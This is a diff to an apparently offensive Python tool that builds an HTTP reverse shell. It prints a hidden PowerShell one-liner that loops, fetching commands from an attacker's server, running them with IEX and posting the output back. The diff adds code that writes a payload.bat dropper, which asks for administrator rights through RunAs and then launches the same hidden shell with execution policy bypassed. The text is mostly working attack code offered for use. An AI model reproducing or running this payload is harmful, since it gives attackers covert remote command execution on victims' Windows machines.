@@ -6,10 +6,24 @@ PORT = 8000
 GREEN = '\033[38;5;47m'; END = '\033[0m'
 
 payload = f"& {{while ($true){{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body $c}}}}"
-print(f"{GREEN}Test{END} payload_powershell:")
+print(f"{GREEN}TESTE- RAWPAYLOAD:{END}")
 print("")
 print("powershell -W hidden {" +payload+"}")
 print("")
+
+print(f"{GREEN}TESTE- PAYLOAD .bat created {END}")
+print("")
+f = open("payload.bat", "w")
+f.write("@echo off\n")
+f.write("net session >nul 2>&1\n")
+f.write("if %errorLevel% == 0 (\n")
+f.write("  goto start\n")
+f.write(") else (\n")
+f.write(f"  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n")
+f.write(")\n")
+f.write(":start\n")
+f.write(f"powershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"& {{while ($true) {{$c=IEX(Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}').Content;$r=Invoke-WebRequest -Uri 'http://{ADDRESS}:{PORT}' -Method POST -Body $c}}}}\"\n")
+f.close()
 
 class Http_Shell(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
